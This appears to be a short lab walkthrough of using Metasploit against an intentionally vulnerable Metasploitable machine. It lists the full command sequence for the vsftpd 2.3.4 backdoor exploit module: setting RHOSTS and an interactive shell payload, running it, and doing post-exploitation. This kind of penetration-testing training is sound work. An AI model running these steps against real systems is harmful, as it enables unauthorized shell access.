🚀 Implementation Steps

🔹 1. Installation and Setup

Metasploit is pre-installed in Kali Linux

Start database service
sudo systemctl start postgresql

Launch Metasploit
msfconsole

🔹 2. Database Initialization

```bash
msfdb init
```

Ensures proper storage of scan results and sessions

🔹 3. Target Identification

Identified vulnerable target machine (Metasploitable)
Obtained target IP address

🔹 4. Search for Exploit

```bash
search vsftpd
```

Selected appropriate exploit module

🔹 5. Configure Exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_ip>
```

🔹 6. Set Payload

```bash
set payload cmd/unix/interact
```

🔹 7. Run Exploit

```bash
exploit
```

🔹 8. Gain Access

Established session on target system

🔹 9. Post Exploitation

Executed commands on target system
Analyzed system behavior

